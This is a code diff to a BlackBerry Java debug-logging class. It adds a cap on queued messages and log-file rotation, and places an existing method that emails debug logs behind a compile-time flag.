@@ -14,7 +14,6 @@ import java.util.Vector;
 import blackberry.fs.AutoFlashFile;
 import blackberry.fs.Path;
 
-// TODO: Auto-generated Javadoc
 /**
  * The Class DebugWriter.
  */
@@ -24,8 +23,12 @@ public final class DebugWriter extends Thread {
     static final String SD_PATH = Path.SD_PATH + FILE_NAME;
     static final String FLASH_PATH = Path.USER_PATH + FILE_NAME;
     private static final long SLEEP_TIME = 1000;
+    
+    private static final int MAX_NUM_MESSAGES = 1000;
 
     private static AutoFlashFile fileDebug;
+
+    boolean haveMessages;
 
     boolean toStop;
     boolean logToSD;
@@ -76,8 +79,13 @@ public final class DebugWriter extends Thread {
      */
     public synchronized boolean append(final String message) {
 
+        if (numMessages > MAX_NUM_MESSAGES * 2) {
+            return false;
+        }
+
         queue.append(message + "\r\n");
         numMessages++;
+        haveMessages = true;
 
         return true;
     }
@@ -93,11 +101,18 @@ public final class DebugWriter extends Thread {
 
         for (;;) {
             synchronized (this) {
-                if (numMessages > 0) {
+
+                if (haveMessages) {
                     final String message = queue.toString();
                     final boolean ret = fileDebug.append(message + "\r\n");
                     queue = new StringBuffer();
-                    numMessages = 0;
+                    haveMessages = false;
+
+                    if (numMessages > MAX_NUM_MESSAGES) {
+                        numMessages = 0;
+                        fileDebug.updateLogs();
+                        createNewFile();
+                    }
                 }
 
                 if (toStop) {
@@ -121,6 +136,7 @@ public final class DebugWriter extends Thread {
         notifyAll();
     }
 
+    //#ifdef SEND_LOG
     public synchronized boolean sendLogs(String email) {
         //byte[] content = fileDebug.read();
         boolean ret = fileDebug.sendLogs(email);
@@ -128,4 +144,5 @@ public final class DebugWriter extends Thread {
 
         return ret;
     }
+    //#endif
 }
